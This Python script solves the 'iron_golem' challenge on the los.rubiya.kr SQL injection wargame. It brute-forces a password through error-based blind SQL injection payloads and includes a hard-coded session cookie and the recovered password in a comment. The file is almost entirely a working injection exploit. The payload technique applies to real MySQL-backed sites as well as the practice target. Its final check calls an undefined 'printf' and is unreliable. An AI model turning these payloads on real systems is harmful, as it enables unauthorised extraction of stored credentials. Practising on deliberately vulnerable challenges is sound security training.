from requests import Session, request

URL = "https://los.rubiya.kr/chall/iron_golem_beb244fe41dd33998ef7bb4211c56c75.php"
session = {"PHPSESSID": "c8o4nup8pn2fn76vsh9mlrmrni"}

PWLength = 0
FLAG = ""


def lengthPW():
    global PWLength
    for i in range(1, 99):

        payload = f"?pw=' or if(length(pw)<{i}, (select 1 union select 2),1)%23"
        res = request(method='GET', url=URL + payload, cookies=session)
        # print(f"[*] in progress {i}")

        if "query :" not in res.text:
            print("PW length is ::", i - 1)
            PWLength = i - 1
            break


def getPW():
    global PWLength
    global FLAG

    for i in range(1, PWLength + 1):
        for j in range(48, 126):
            # print(i, j)
            payload = f"?pw=' or if(ascii(substr(pw,{i},1))={j}, (select 1 union select 2), 1)%23"
            res = request(method='GET', url=URL + payload, cookies=session)

            if "query :" not in res.text:
                print(f"PW[{str(i)}] is :: {chr(j)}")
                FLAG = FLAG + chr(j)

    print(f"PW :: {FLAG}")
    printf(len(FLAG) == PWLength + 1)


if __name__ == '__main__':
    lengthPW()
    getPW()  # 06b5a6c16e8830475f983cc3a825ee9a
